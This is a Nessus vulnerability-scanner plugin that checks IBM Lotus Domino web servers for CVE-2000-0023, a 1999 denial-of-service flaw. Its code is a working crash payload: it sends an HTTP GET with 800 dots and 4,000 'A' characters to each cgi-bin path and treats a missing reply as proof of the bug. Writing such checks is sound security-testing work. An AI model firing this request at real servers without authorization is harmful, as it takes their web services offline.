#
# This script was written by Alain Thivillon <Alain.Thivillon@hsc.fr>
#
# See the Nessus Scripts License for details
#
# Changes by Tenable:
# - Revised plugin title (2/04/2009)
# - Changed family (6/29/2009)

include("compat.inc");

if (description)
{
 script_id(10059);
 script_version("$Revision: 1.35 $");
 script_cvs_date("$Date: 2016/11/15 13:39:09 $");

 script_cve_id("CVE-2000-0023");
 script_bugtraq_id(881);
 script_osvdb_id(51);

 script_name(english:"IBM Lotus Domino HTTP /cgi-bin Relative URL Request DoS");
 script_summary(english:"Crashes the Domino HTTP server");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service attack.");
 script_set_attribute(attribute:"description", value:
"It was possible to perform a denial of service against the remote web
server by sending it a long /cgi-bin relative URL. 

This problem allows an attacker to prevent your Lotus Domino web
server from handling requests.");
 script_set_attribute(attribute:"see_also", value:
"http://seclists.org/bugtraq/1999/Dec/257");
 script_set_attribute(attribute:"see_also", value:
"http://seclists.org/bugtraq/1999/Dec/329");
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for a patch or use a different product.

Also, consider changing cgi-bin mapping by something impossible to guess in
server document of primary Notes NAB.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:C");
 script_set_attribute(attribute:"vuln_publication_date", value:"1999/12/21");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/12/21");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:lotus_domino");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2016 Renaud Deraison and Alain Thivillon");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

banner = get_kb_item("www/hmap/" + port + "/description");
if (! banner)
  banner = get_http_banner(port:port);
if ("Lotus Domino" >!< banner )
 exit(0, "The web server on port "+port+" is not Lotus Domino");

foreach dir (cgi_dirs())
{
 c = string(dir, "/", crap(length:800, data:"."), crap(length:4000,data:"A"));
 soc = http_open_socket(port);
 if(! soc) exit(1, "Cannot connect to TCP port "+port+".");
  req = http_get(item:c, port:port);
  send(socket:soc, data:req);
  s = http_recv(socket:soc);
  http_close_socket(soc);
  if(!s) {
  	security_warning(port);
	exit(0);
	}
}

